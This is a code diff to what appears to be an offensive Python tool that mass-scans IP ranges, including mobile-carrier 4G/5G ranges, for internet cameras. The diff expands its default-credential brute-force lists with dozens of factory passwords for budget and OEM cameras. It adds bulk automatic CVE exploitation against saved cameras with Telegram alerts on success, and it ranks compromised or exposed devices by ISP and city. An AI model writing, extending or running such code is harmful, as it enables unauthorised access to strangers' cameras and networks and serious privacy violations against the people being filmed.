@@ -794,10 +794,89 @@ MODEL_DEFAULT_CREDS: dict = {
     'hanwha':    [('admin','admin4321'),('admin','admin'),('admin','4321')],
     'amcrest':   [('admin','admin'),('admin','admin123'),('admin','')],
     'uniview':   [('admin','123456'),('admin','Admin123'),('admin','')],
-    'reolink':   [('admin',''),('admin','123456')],
     'tp-link':   [('admin','admin'),('admin',''),('admin','tplink')],
     'wyze':      [('admin','admin'),('admin','wyze')],
+    # ── 4G/5G modem-attached cameras ──────────────────────────────────────
+    'huawei':    [('admin','Admin@huawei'),('admin','Huawei@123'),('admin','huawei'),
+                  ('admin','admin'),('admin','12345'),('admin','')],
+    'zte':       [('admin','zte'),('admin','ZTE@123'),('admin','ZTE123'),
+                  ('admin','admin'),('admin','12345'),('admin','1234')],
+    'xm':        [('admin','xc3511'),('admin','jvbss'),('xmhdipc','jvbss'),
+                  ('admin','admin'),('admin','12345')],
+    'xiongmai':  [('admin','xc3511'),('admin','jvbss'),('xmhdipc','jvbss'),
+                  ('admin','admin'),('admin','12345')],
+    'ipcam':     [('ipcam','ipcam'),('admin','ipcam'),('admin',''),('admin','admin')],
+    'generic':   [('admin','admin'),('admin','12345'),('admin',''),('root','root'),
+                  ('admin','1234'),('admin','123456')],
 }
+
+# ── 4G/5G modem-camera specific credentials (used in 4G/5G scan mode) ────────
+# These are common factory-default passwords for cameras/devices on mobile ISP ranges.
+# Includes: Huawei OEM, ZTE, XiongMai/XM chipset, Hisilicon, ipcam brands.
+_4G_MODEM_CREDS: list = [
+    # XiongMai / XM chipset (most budget Chinese 4G cams)
+    ("admin",    "xc3511"),
+    ("admin",    "jvbss"),
+    ("xmhdipc",  "jvbss"),
+    ("xmhdipc",  "xmhdipc"),
+    ("root",     "vizxv"),
+    ("admin",    "vizxv"),
+    ("admin",    "xm123456"),
+    # Huawei OEM cameras / routers
+    ("admin",    "Admin@huawei"),
+    ("admin",    "Huawei@123"),
+    ("admin",    "huawei"),
+    ("admin",    "Admin@1234"),
+    # ZTE modems / cameras
+    ("admin",    "zte"),
+    ("admin",    "ZTE@123"),
+    ("admin",    "ZTE123"),
+    ("admin",    "zte1234"),
+    # Hisilicon-based cameras
+    ("admin",    "hi3518"),
+    ("admin",    "hisilicon"),
+    ("root",     "hi3518"),
+    # Generic ipcam brands
+    ("ipcam",    "ipcam"),
+    ("ipc",      "ipc"),
+    ("camera",   "camera"),
+    ("admin",    "ipcam"),
+    ("admin",    "ipcam123"),
+    # Cheap 4G-attached DVR/NVR
+    ("admin",    "dvr"),
+    ("admin",    "dvr1234"),
+    ("admin",    "nvr"),
+    ("admin",    "nvr1234"),
+    ("888888",   "888888"),
+    ("666666",   "666666"),
+    # Common mobile/wifi router admin panels
+    ("admin",    "wifi"),
+    ("admin",    "wireless"),
+    ("admin",    "mobile"),
+    ("admin",    "internet"),
+    # Simple numerics very common on budget cams
+    ("admin",    ""),
+    ("admin",    "admin"),
+    ("admin",    "12345"),
+    ("admin",    "123456"),
+    ("admin",    "1234"),
+    ("admin",    "0000"),
+    ("admin",    "111111"),
+    ("admin",    "888888"),
+    ("root",     ""),
+    ("root",     "root"),
+    ("root",     "admin"),
+    ("root",     "12345"),
+    ("root",     "pass"),
+]
+
+def _merge_4g_creds(base_creds: list) -> list:
+    """Merge standard credentials with 4G/5G modem-camera specific defaults.
+    Deduplicates while keeping 4G-specific creds near the front."""
+    seen = set(base_creds)
+    extra = [c for c in _4G_MODEM_CREDS if c not in seen]
+    # Put the most common 4G defaults first, then the rest
+    return extra + base_creds
 
 # ── Lockout cooldown timestamp (for indicator in live progress bar) ────────────
 _lockout_cooldown_ts: float = 0.0
@@ -2585,14 +2664,85 @@ def record_isp(isp: str) -> None:
         return
     with _isp_tracker_lock:
         _ISP_TRACKER[isp] = _ISP_TRACKER.get(isp, 0) + 1
+    # Persist every 50 new sightings to avoid losing data on crash
+    if _ISP_TRACKER.get(isp, 0) % 50 == 1:
+        try:
+            with open(_ISP_TRACKER_FILE, 'w', encoding='utf-8') as _f:
+                json.dump(_ISP_TRACKER, _f)
+        except Exception:
+            pass
+
+_ISP_TRACKER_FILE = os.path.join(SCRIPT_DIR, 'isp_tracker.json')
+
+def _save_isp_tracker() -> None:
+    """Persist _ISP_TRACKER to disk."""
+    try:
+        with open(_ISP_TRACKER_FILE, 'w', encoding='utf-8') as _f:
+            json.dump(_ISP_TRACKER, _f)
+    except Exception:
+        pass
+
+def _load_isp_tracker() -> None:
+    """Load _ISP_TRACKER from disk on startup."""
+    global _ISP_TRACKER
+    try:
+        if os.path.exists(_ISP_TRACKER_FILE):
+            with open(_ISP_TRACKER_FILE, 'r', encoding='utf-8') as _f:
+                _ISP_TRACKER.update(json.load(_f))
+    except Exception:
+        pass
+
+def _build_isp_report_from_files() -> dict:
+    """Build ISP counts by doing geo lookups on IPs from ValidCamera files."""
+    tracker: dict = {}
+    for fp in find_valid_camera_files():
+        try:
+            with open(fp, 'r', encoding='utf-8', errors='replace') as _f:
+                for line in _f:
+                    if line.startswith('IP:'):
+                        ip = line.split(':', 1)[1].strip().split(':')[0]
+                        geo = get_geographic_location(ip)
+                        if geo:
+                            isp = geo.get('isp') or geo.get('org') or ''
+                            if isp:
+                                tracker[isp] = tracker.get(isp, 0) + 1
+        except Exception:
+            pass
+    return tracker
 
 def isp_diversity_report() -> None:
     """Display distribution of found devices across ISPs."""
-    C, G, Y, W = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL
-    if not _ISP_TRACKER:
-        print(f"{Y}[!] No ISP data recorded yet — start a scan first.{W}")
-        return
-    ranked = sorted(_ISP_TRACKER.items(), key=lambda x: x[1], reverse=True)
+    C, G, Y, W, Y2 = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.YELLOW
+    tracker = dict(_ISP_TRACKER)
+    if not tracker:
+        # Try loading from disk
+        _load_isp_tracker()
+        tracker = dict(_ISP_TRACKER)
+    if not tracker:
+        # Offer to build from ValidCamera files
+        files = find_valid_camera_files()
+        if not files:
+            print(f"{Y}[!] No ISP data and no ValidCamera files found.{W}")
+            print(f"  {C}→ Start a scan first to collect ISP data automatically.{W}")
+            return
+        print(f"\n{Y}[!] No live ISP data recorded yet.{W}")
+        print(f"  {C}ISP data is collected automatically during scans (geo lookups).{W}")
+        print(f"  {C}Option: build report from {len(files)} saved ValidCamera file(s) now?{W}")
+        print(f"  {Y}Note: this makes geo API calls for each saved IP — may be slow.{W}")
+        _ch = input(f"{G}Build from saved files? [y/N]: {W}").strip().lower()
+        if _ch != 'y':
+            print(f"  {C}→ Start any scan to populate ISP data automatically next time.{W}")
+            return
+        print(f"{C}[→] Looking up ISP data from saved cameras...{W}")
+        tracker = _build_isp_report_from_files()
+        if tracker:
+            with _isp_tracker_lock:
+                _ISP_TRACKER.update(tracker)
+            _save_isp_tracker()
+        if not tracker:
+            print(f"{Y}[!] No ISP data found in ValidCamera files.{W}")
+            return
+    ranked = sorted(tracker.items(), key=lambda x: x[1], reverse=True)
     total  = sum(v for _, v in ranked)
     print(f"\n{C}{'═'*62}{W}")
     print(f"{G}  ISP Diversity Report — {len(ranked)} ISPs, {total} devices{W}")
@@ -7232,6 +7382,17 @@ def scan_ip_range(start_ip: str,
     mascot_react('scanning', f"Scanning {total_ips} IPs with {max_workers} threads...")
     start_scan_dashboard(15)
 
+    # ── Background progress saver (saves every 30 s so scan can be resumed) ──
+    _ir_range_label = f"{start_ip}-{end_ip}"
+    _bg_saver_stop.clear()
+    _ir_bg_saver_t = threading.Thread(
+        target=_bg_progress_saver,
+        args=(_ir_range_label, f"IP Range {_ir_range_label}", total_ips,
+              os.path.join(SCRIPT_DIR, 'range_scan_found.txt')),
+        daemon=True
+    )
+    _ir_bg_saver_t.start()
+
     # ── Background progress-ticker thread ────────────────────────────────────
     # Prints the ⚡ line every 2 s so the bar stays live even when all worker
     # threads are blocked waiting for network timeouts (can be 40+ s each).
@@ -7313,8 +7474,9 @@ def scan_ip_range(start_ip: str,
                 with results_lock:
                     scanned_count += 1
 
-    # Stop the background progress ticker before printing final stats
+    # Stop the background progress ticker and progress saver before finishing
     _ir_tick_ev.set()
+    _bg_saver_stop.set()
     print()  # move past the \r progress line
 
     stop_scan_dashboard()
@@ -8321,7 +8483,12 @@ def get_geographic_location(ip: str) -> dict:
                 location_info['region'] = data.get('regionName', 'Unknown')
                 location_info['city'] = data.get('city', 'Unknown')
                 location_info['postal_code'] = data.get('zip', 'Unknown')
+                location_info['isp'] = data.get('isp', '')
+                location_info['org'] = data.get('org', '')
                 if location_info['country'] != 'Unknown':
+                    _isp_val = data.get('isp') or data.get('org') or ''
+                    if _isp_val:
+                        record_isp(_isp_val)
                     with _geo_cache_lock:
                         _geo_cache[ip] = location_info
                     return location_info
@@ -13269,6 +13436,7 @@ def download_device_config(ip: str, port: int, username: str, password: str,
 def city_level_grouping(file_path: str = None) -> None:
     """Parse a ValidCamera file and rank cities by exposed device count."""
     C, G, Y, W = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL
+    selected_files = []
     if not file_path:
         files = find_valid_camera_files()
         if not files:
@@ -13277,25 +13445,34 @@ def city_level_grouping(file_path: str = None) -> None:
         print(f"\n{C}Select file for city grouping:{W}")
         for i, f in enumerate(files, 1):
             print(f"  {Y}{i}.{W} {os.path.basename(f)}")
+        print(f"  {Y}a.{W} ALL files combined")
         try:
-            ch = input(f"{G}Choice: {W}").strip()
-            idx = int(ch) - 1
-            file_path = files[idx]
+            ch = input(f"{G}Choice: {W}").strip().lower()
+            if ch == 'a':
+                selected_files = files
+            else:
+                idx = int(ch) - 1
+                selected_files = [files[idx]]
         except Exception:
             return
+    else:
+        selected_files = [file_path]
     cities: dict = {}
-    try:
-        with open(file_path, 'r', encoding='utf-8', errors='replace') as _f:
-            for line in _f:
-                if line.startswith('City:'):
-                    city = line.split(':', 1)[1].strip()
-                    cities[city] = cities.get(city, 0) + 1
-    except Exception as e:
-        print(f"{Y}[!] Error reading file: {e}{W}")
+    for fp in selected_files:
+        try:
+            with open(fp, 'r', encoding='utf-8', errors='replace') as _f:
+                for line in _f:
+                    if line.startswith('City:'):
+                        city = line.split(':', 1)[1].strip()
+                        cities[city] = cities.get(city, 0) + 1
+        except Exception as e:
+            print(f"{Y}[!] Error reading {os.path.basename(fp)}: {e}{W}")
+    if not cities:
         return
+    label = "ALL files" if len(selected_files) > 1 else os.path.basename(selected_files[0])
     ranked = sorted(cities.items(), key=lambda x: x[1], reverse=True)
     print(f"\n{C}{'═'*50}{W}")
-    print(f"{G}  City Rankings — {os.path.basename(file_path)}{W}")
+    print(f"{G}  City Rankings — {label}{W}")
     print(f"{C}{'═'*50}{W}")
     for rank, (city, count) in enumerate(ranked[:30], 1):
         bar = '█' * min(count, 40)
@@ -13309,35 +13486,45 @@ def result_diff_viewer() -> None:
     if len(files) < 2:
         print(f"{Y}[!] Need at least 2 ValidCamera files to compare.{W}")
         return
-    print(f"\n{C}Select File A (older):{W}")
-    for i, f in enumerate(files, 1):
-        print(f"  {Y}{i}.{W} {os.path.basename(f)}")
+
+    def _extract_ips(path_or_list):
+        ips = set()
+        paths = path_or_list if isinstance(path_or_list, list) else [path_or_list]
+        for path in paths:
+            try:
+                with open(path, 'r', encoding='utf-8', errors='replace') as _f:
+                    for line in _f:
+                        if line.startswith('IP:'):
+                            ips.add(line.split(':', 1)[1].strip())
+            except Exception:
+                pass
+        return ips
+
+    def _pick_file(label, files):
+        print(f"\n{C}Select {label}:{W}")
+        for i, f in enumerate(files, 1):
+            print(f"  {Y}{i}.{W} {os.path.basename(f)}")
+        print(f"  {Y}a.{W} ALL files combined")
+        ch = input(f"{G}{label}: {W}").strip().lower()
+        if ch == 'a':
+            return files, "ALL files"
+        idx = int(ch) - 1
+        return [files[idx]], os.path.basename(files[idx])
+
     try:
-        a_idx = int(input(f"{G}File A: {W}").strip()) - 1
-        b_idx = int(input(f"{G}File B: {W}").strip()) - 1
-        fa, fb = files[a_idx], files[b_idx]
+        files_a, label_a = _pick_file("File A (older)", files)
+        files_b, label_b = _pick_file("File B (newer)", files)
     except Exception:
         return
 
-    def _extract_ips(path):
-        ips = set()
-        try:
-            with open(path, 'r', encoding='utf-8', errors='replace') as _f:
-                for line in _f:
-                    if line.startswith('IP:'):
-                        ips.add(line.split(':', 1)[1].strip())
-        except Exception:
-            pass
-        return ips
-
-    ips_a = _extract_ips(fa)
-    ips_b = _extract_ips(fb)
+    ips_a = _extract_ips(files_a)
+    ips_b = _extract_ips(files_b)
     new_ips  = ips_b - ips_a
     gone_ips = ips_a - ips_b
     same_ips = ips_a & ips_b
     print(f"\n{C}{'═'*50}{W}")
-    print(f"  A: {os.path.basename(fa)}  ({len(ips_a)} IPs)")
-    print(f"  B: {os.path.basename(fb)}  ({len(ips_b)} IPs)")
+    print(f"  A: {label_a}  ({len(ips_a)} IPs)")
+    print(f"  B: {label_b}  ({len(ips_b)} IPs)")
     print(f"{C}{'─'*50}{W}")
     print(f"  {G}New  (in B not A):{W} {len(new_ips)}")
     for ip in sorted(new_ips)[:20]:
@@ -16537,25 +16724,67 @@ def tools_submenu() -> None:
         # ── 10. CVE Lookup + Exploitation ─────────────────────────────────────
         elif sub == '10':
             try:
-                print(f"  {Y}(type 'b' to go back){W}")
-                _ct = input(f"{G}Camera type / model (e.g. hikvision, dahua): {W}").strip()
-                if _ct.lower() in ('b', 'back', ''):
+                print(f"\n{C}CVE Lookup Mode:{W}")
+                print(f"  {Y}1.{W} Lookup by camera type (manual)")
+                print(f"  {Y}2.{W} Bulk scan from saved ValidCamera files")
+                print(f"  {Y}b.{W} Back")
+                _cve_mode = input(f"{G}Choice: {W}").strip().lower()
+                if _cve_mode in ('b', 'back', ''):
                     continue
-                cves = check_cve(_ct)
-                if cves:
-                    print(f"\n{C}CVE findings for '{_ct}':{W}")
-                    for _cve, _desc, _sev in cves:
-                        _sc = R if _sev == 'CRITICAL' else Y if _sev == 'HIGH' else W
-                        print(f"  {_sc}[{_sev}]{W} {C}{_cve}{W} — {_desc}")
-                    # ── Offer to run live exploitation PoC ────────────────────
-                    try:
-                        _do_exp = input(
-                            f"\n{Y}Try exploitation PoC HTTP requests? (requires IP:PORT) [Y/n]: {W}"
-                        ).strip().lower()
-                        if _do_exp != 'n':
-                            _exp_target = input(f"{G}Target IP:PORT (e.g. 192.168.1.100:80): {W}").strip()
-                            if _exp_target and _exp_target.lower() not in ('b', 'back'):
-                                _exp_ip, _, _exp_pt = _exp_target.partition(':')
+
+                if _cve_mode == '2':
+                    # ── Bulk mode: load from ValidCamera files ─────────────
+                    _cve_cams = _pick_cameras_bulk('CVE Lookup')
+                    if not _cve_cams:
+                        continue
+                    print(f"\n{C}[→] Running CVE lookup on {len(_cve_cams)} cameras...{W}")
+                    _cve_all_hits = []
+                    for _cam10 in _cve_cams:
+                        _ct10  = _cam10.get('camera_type', '')
+                        _ip10  = _cam10.get('ip', '')
+                        _pt10  = _cam10.get('port', 80)
+                        _cves10 = check_cve(_ct10)
+                        if _cves10:
+                            print(f"\n{Y}[{_ip10}:{_pt10}]{W} {_ct10}")
+                            for _cve, _desc, _sev in _cves10:
+                                _sc = R if _sev == 'CRITICAL' else Y if _sev == 'HIGH' else W
+                                print(f"  {_sc}[{_sev}]{W} {C}{_cve}{W} — {_desc}")
+                            # Auto-run PoC
+                            _exp_r = try_exploit_cve(_ip10, int(_pt10), _ct10)
+                            _hits10 = [r for r in _exp_r if r.get('exploited')]
+                            _cve_all_hits.extend(_hits10)
+                            if _hits10 and TELEGRAM_CONFIG.get("enabled"):
+                                _tg10 = (f"🚨 <b>CVE Exploitation Confirmed!</b>\n"
+                                         f"📍 <code>{_ip10}:{_pt10}</code>\n"
+                                         f"📷 Type: {_ct10}\n\n")
+                                for _er10 in _hits10:
+                                    _tg10 += (f"🔓 <b>{_er10['cve_id']}</b> [{_er10['severity']}]\n"
+                                              f"   {_er10['desc']}\n"
+                                              f"   HTTP {_er10['status_code']}\n\n")
+                                send_telegram_message(_tg10)
+                        else:
+                            print(f"  {Y}[{_ip10}] No known CVEs for '{_ct10}'{W}")
+                    print(f"\n{G}[✓] Bulk CVE scan done. {len(_cve_all_hits)} confirmed vulnerable.{W}")
+
+                else:
+                    # ── Manual mode ───────────────────────────────────────
+                    print(f"  {Y}(type 'b' to go back){W}")
+                    _ct = input(f"{G}Camera type / model (e.g. hikvision, dahua): {W}").strip()
+                    if _ct.lower() in ('b', 'back', ''):
+                        continue
+                    cves = check_cve(_ct)
+                    if cves:
+                        print(f"\n{C}CVE findings for '{_ct}':{W}")
+                        for _cve, _desc, _sev in cves:
+                            _sc = R if _sev == 'CRITICAL' else Y if _sev == 'HIGH' else W
+                            print(f"  {_sc}[{_sev}]{W} {C}{_cve}{W} — {_desc}")
+                        # ── Offer to run live exploitation PoC ────────────
+                        try:
+                            _do_exp = input(
+                                f"\n{Y}Try exploitation PoC? Enter IP:PORT or press Enter to skip: {W}"
+                            ).strip().lower()
+                            if _do_exp and _do_exp not in ('n', 'b', 'back'):
+                                _exp_ip, _, _exp_pt = _do_exp.partition(':')
                                 _exp_port = int(_exp_pt or 80)
                                 print(f"\n{C}[→] Running CVE exploitation probes on {_exp_ip}:{_exp_port}...{W}")
                                 _exp_results = try_exploit_cve(_exp_ip, _exp_port, _ct)
@@ -16575,10 +16804,10 @@ def tools_submenu() -> None:
                                         send_telegram_message(_tg_cve10)
                                 else:
                                     print(f"{Y}  No confirmed vulnerabilities from PoC requests.{W}")
-                    except (EOFError, KeyboardInterrupt, ValueError):
-                        pass
-                else:
-                    print(f"{Y}  No known CVEs for '{_ct}'.{W}")
+                        except (EOFError, KeyboardInterrupt, ValueError):
+                            pass
+                    else:
+                        print(f"{Y}  No known CVEs for '{_ct}'.{W}")
             except (EOFError, KeyboardInterrupt):
                 pass
             if _tools_wait_back():
@@ -16611,15 +16840,20 @@ def tools_submenu() -> None:
         # ── 15. Config Backup Analyzer ────────────────────────────────────────
         elif sub == '15':
             try:
+                # Only real camera config backups — exclude scan progress JSON files
                 _files = [f for f in os.listdir(SCRIPT_DIR)
                           if f.endswith(('.bin', '.cfg', '.backup', '.bak', '.dat'))
+                          and not f.endswith('.json.bak')
+                          and not f.startswith(('scan_progress', 'brute_progress'))
                           and os.path.isfile(os.path.join(SCRIPT_DIR, f))]
                 _dcdir = os.path.join(SCRIPT_DIR, 'DeviceConfigs')
                 if os.path.isdir(_dcdir):
-                    _files += [os.path.join(_dcdir, f) for f in os.listdir(_dcdir)]
+                    _files += [os.path.join(_dcdir, f) for f in os.listdir(_dcdir)
+                               if not f.endswith('.json.bak')]
                 if not _files:
-                    print(f"{Y}[!] No config backup files found. "
-                          f"Use option 4 to download one first.{W}")
+                    print(f"{Y}[!] No camera config backup files found.{W}")
+                    print(f"  {C}→ Use Extra Tools → 4 (Config File Downloader) to fetch one from a camera.{W}")
+                    print(f"  {C}→ Scan progress files (brute_progress.json.bak etc.) are not camera configs.{W}")
                 else:
                     print(f"\n{C}Config backup files:{W}")
                     for _i, _fp in enumerate(_files, 1):
@@ -16845,7 +17079,7 @@ def tools_submenu() -> None:
 
                         if _act23 == 'a':
                             # ── Scan ALL ranges one by one ─────────────────────────────
-                            _creds23 = load_credentials()
+                            _creds23 = _merge_4g_creds(load_credentials())
                             for _ridx23, (_tcc23, _cidr23) in enumerate(_ranges23, 1):
                                 if _stop_requested.is_set():
                                     break
@@ -16864,16 +17098,33 @@ def tools_submenu() -> None:
                             print(f"\n{G}[✓] All {len(_ranges23)} 4G/5G ranges scanned.{W}")
 
                         elif _act23 == 's':
-                            _cidx23 = input(f"{G}Select range number: {W}").strip()
+                            print(f"  {Y}Enter a number (e.g. 4), a range (e.g. 4-11), or comma list (e.g. 1,3,5){W}")
+                            _cidx23 = input(f"{G}Select range(s): {W}").strip()
                             try:
-                                _sel23 = _ranges23[int(_cidx23) - 1][1]
-                                _net23 = _ip23mod.IPv4Network(_sel23, strict=False)
-                                _hs23  = list(_net23.hosts())
-                                if _hs23:
-                                    _s23 = str(_hs23[0])
-                                    _e23 = str(_hs23[-1])
-                                    print(f"{C}[4G/5G Scan] {_sel23} → {_s23} – {_e23}{W}")
-                                    scan_ip_range(_s23, _e23, load_credentials())
+                                # Parse single / range / comma list
+                                _sel_indices23 = []
+                                for _part23 in _cidx23.split(','):
+                                    _part23 = _part23.strip()
+                                    if '-' in _part23:
+                                        _lo23, _hi23 = _part23.split('-', 1)
+                                        _sel_indices23.extend(range(int(_lo23) - 1, int(_hi23)))
+                                    else:
+                                        _sel_indices23.append(int(_part23) - 1)
+                                _creds23s = _merge_4g_creds(load_credentials())
+                                for _si23 in _sel_indices23:
+                                    if _stop_requested.is_set():
+                                        break
+                                    if _si23 < 0 or _si23 >= len(_ranges23):
+                                        print(f"{R}[!] Range {_si23+1} out of bounds, skipped.{W}")
+                                        continue
+                                    _tcc23s, _sel23 = _ranges23[_si23]
+                                    _net23 = _ip23mod.IPv4Network(_sel23, strict=False)
+                                    _hs23  = list(_net23.hosts())
+                                    if _hs23:
+                                        _s23 = str(_hs23[0])
+                                        _e23 = str(_hs23[-1])
+                                        print(f"{C}[4G/5G Scan {_si23+1}] {_tcc23s} {_sel23} → {_s23} – {_e23}{W}")
+                                        scan_ip_range(_s23, _e23, _creds23s)
                             except (IndexError, ValueError) as _e23err:
                                 print(f"{R}[!] Error: {_e23err}{W}")
                     except (EOFError, KeyboardInterrupt):
